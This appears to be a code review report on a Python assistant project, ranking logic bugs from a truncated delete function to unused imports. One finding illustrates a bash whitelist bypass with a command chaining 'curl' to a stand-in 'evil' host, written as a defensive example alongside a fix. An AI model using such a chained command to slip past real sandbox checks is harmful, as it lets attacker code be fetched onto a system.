# TRON-X — Logical Error Review

Scope: project source in `src/` (~16k LOC, 70 files). The bundled third-party `kokoro-onnx/` library was excluded. Syntax compiles cleanly across all files; findings below are logic/correctness issues, ordered by severity.

---

## Critical

### 1. `forget_before()` is truncated — does nothing
`src/memory/episodic_memory.py:410-414` (end of file)

```python
async def forget_before(self, days: int, confirm: bool = False) -> dict:
    """Delete all episodes older than N days."""
    if not confirm:
        return {"error": "Set confirm=True to delete old episodes"}
    cutoff = (datetime.now(timezone.utc) - timedelta(days=days)).timestamp()
    # <-- file ends here
```

The function computes `cutoff` and then the file ends. With `confirm=True` it deletes nothing, ignores `cutoff`, and returns `None` (callers expecting a dict will break). The implementation is missing entirely.

**Fix:** query episodes with `timestamp < cutoff` and delete them, then return a result dict — mirroring `forget_session()` above it.

---

## High

### 2. Timed-out subprocesses are never killed
`src/system/executor.py` — `execute_python`, `execute_python_safe`, `execute_js`, `execute_bash`

```python
except asyncio.TimeoutError:
    return {"success": False, "error": f"Timed out after {timeout}s"}
```

On timeout the coroutine returns but the child process is left running. Code with an infinite loop or a hang keeps consuming CPU/memory after the "timeout" — so the timeout doesn't actually stop anything.

**Fix:** in the timeout handler, `proc.kill()` then `await proc.communicate()` (or `await proc.wait()`) before returning. Applies to all four runners.

### 3. Bash whitelist only checks the first token of the first line
`src/system/executor.py:333-340` (`execute_bash`)

```python
first_cmd = next(
    (line.strip().split()[0] for line in code.splitlines() if line.strip()), ""
)
if first_cmd not in _BASH_WHITELIST:
    return {... "Command not whitelisted" ...}
```

Only the very first command is validated. Anything chained or on later lines runs unchecked, e.g.:

```
echo ok && curl http://evil -o /tmp/x
```

`echo` passes the whitelist; `curl` runs. (`curl`/`wget` are only blocked when piped into a shell, not otherwise.) The whitelist gives a false sense of safety.

**Fix:** parse and validate every command (split on `;`, `&&`, `||`, `|`, newlines), or run with a strict explicit allow-list executor rather than `bash -c`.

---

## Medium

### 4. `allow_network=True` disables *all* safety checks, not just network
`src/system/executor.py:36-53` (`execute_python`)

```python
warning = _precheck(code)
if warning and not allow_network:
    return {... "blocked" ...}
```

The flag is named "allow_network", but setting it bypasses the entire precheck (subprocess, ctypes, shutil, etc.). Also, the module docstring claims "no network access from subprocess," which nothing in the code enforces — the subprocess is a normal interpreter with full network access.

**Fix:** scope the flag to network-related entries only, and either enforce the no-network claim or correct the docstring. (`_precheck` also does naive substring matching, so a variable like `my_shutil_helper` triggers a false positive — prefer the AST scan used by `execute_python_safe`.)

### 5. Temperature of 0 is treated as "no value"
`src/iot/nl_mapper.py:120-122`

```python
temp = _extract_number(low)
if temp:                       # 0.0 is falsy -> command dropped
    ...
```

"set temperature to 0" yields `temp = 0.0`, which is falsy, so the command is silently ignored. The brightness branch nearby correctly uses `pct is not None`; this branch should too. Separately, `brightness_pct` is never clamped to 0–100, so "brightness to 500" is passed through unchanged.

**Fix:** use `if temp is not None:`; clamp `brightness_pct` to `[0, 100]`.

---

## Low / cleanup

- **`src/agents/coordinator.py:70`** — `orch = get_orchestrator()` is created but never used in the legacy `research` agent (the orchestrator is never passed to `ResearchAgent().run`). Dead code; either wire it in or remove.
- **`src/intelligence/orchestrator.py:248`** — `clf_method` (how the intent was classified: forced/keyword/llm/explicit) is unpacked but never used or logged, so that signal is lost from analytics.
- **`src/memory/chroma_db.py:197`** — MMR computes `query_vec = embed_one(query)` but never uses it (relevance comes from precomputed `hits[i]["score"]`). Functionally fine, but it's a wasted embedding call on every MMR rerank.
- **`src/api/voice.py:387,400`** — `nonlocal session_id` is declared but never reassigned, and `tts_done = asyncio.Event()` is created but never set or awaited — suggests the TTS-completion signaling is incomplete/dead.
- **`src/memory/chroma_db.py:61`** — f-string with no placeholders (`f"[chroma] Collections: "` immediately concatenated with `+`). Harmless, drop the `f`.
- **~50 unused imports** across the tree (pyflakes), incl. `paho.mqtt.client` in `mqtt_client.py`, `cadquery` in `cad_agent.py`, `playwright` in `system/browser.py`, `openwakeword`/`numpy` in `wake_word.py`. Mostly noise, but a few sit inside `try:` import guards where their absence may mask a missing-dependency path.

---

## Notes on what looked suspicious but is fine
- `intent.py:178` `method is "keyword" | "llm" | "cache"` is inside a **docstring**, not code.
- Feeds (`crypto`, `stocks`, `analytics/collector`) guard all percentage/division math against zero correctly.
- `router.py` failover, circuit-breaker, rate-limiter, and A/B logic are sound.
- `ratelimit.py` mixes `time.monotonic()` and `time.time()` but does so correctly (duration added to wall-clock for the reset epoch).
